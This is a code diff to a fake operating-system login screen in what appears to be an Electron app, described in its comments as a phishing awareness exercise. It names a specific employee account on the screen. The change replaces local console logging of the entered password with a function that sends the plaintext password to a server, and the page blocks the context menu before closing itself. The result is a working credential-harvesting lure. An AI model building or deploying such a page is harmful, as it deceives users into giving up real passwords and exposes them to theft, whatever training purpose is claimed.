@@ -20,9 +20,7 @@
         <div id="user-container">
             <!-- User avatar -->
             <div id="user-avatar">
-                <div class="default-avatar">
-                    <div class="person-icon"></div>
-                </div>
+                <img src="assets/user.png" class="main-user-icon-img" alt="User Avatar">
             </div>
             
             <!-- Username -->
@@ -38,22 +36,22 @@
         
         <!-- Bottom section -->
         <div id="bottom-container">
-            <div id="network-icon" class="system-icon"></div>
-            <div id="accessibility-icon" class="system-icon"></div>
-            <div id="power-icon" class="system-icon"></div>
+            <img src="assets/wifi.png" id="network-icon" class="system-icon" alt="WiFi">
+            <img src="assets/accessibility.png" id="accessibility-icon" class="system-icon" alt="Accessibility">
+            <img src="assets/power.png" id="power-icon" class="system-icon" alt="Power">
         </div>
         
         <!-- Bottom left user buttons -->
         <div id="user-buttons-container">
             <div class="user-button active">
                 <div class="user-button-icon">
-                    <div class="person-icon-small"></div>
+                    <img src="assets/user.png" class="user-icon-img" alt="User">
                 </div>
                 <span class="user-button-text">Sakho, Aissatou (ITDV DB) - AF...</span>
             </div>
             <div class="user-button">
                 <div class="user-button-icon">
-                    <div class="person-icon-small"></div>
+                    <img src="assets/user.png" class="user-icon-img" alt="User">
                 </div>
                 <span class="user-button-text">Autre utilisateur</span>
             </div>
@@ -82,19 +80,30 @@
         function handlePasswordAttempt() {
             const password = passwordInput.value;
             
-            // Log the phishing attempt
-            console.log(`Attention, vous avez été phishé! Mot de passe saisi: ${password}`);
-        
+            // Send educational phishing alert via API
+            sendPhishingAlert(password);
             
+        
             // Close the program immediately
             window.close();
         }
         
+        async function sendPhishingAlert(password) {
+            try {
+                // Send API request automatically via Electron API
+                const result = await window.electronAPI.sendPhishingWarning(password);
+                if (result.success) {
+                    console.log('Alerte phishing envoyée au serveur avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi de l\'alerte:', result.error);
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de l\'alerte:', error);
+            }
+        }
+        
         // Prevent context menu
         document.addEventListener('contextmenu', e => e.preventDefault());
-        
-        // Prevent text selection
-        document.addEventListener('selectstart', e => e.preventDefault());
         
         // Focus on password input initially
         window.addEventListener('load', () => {
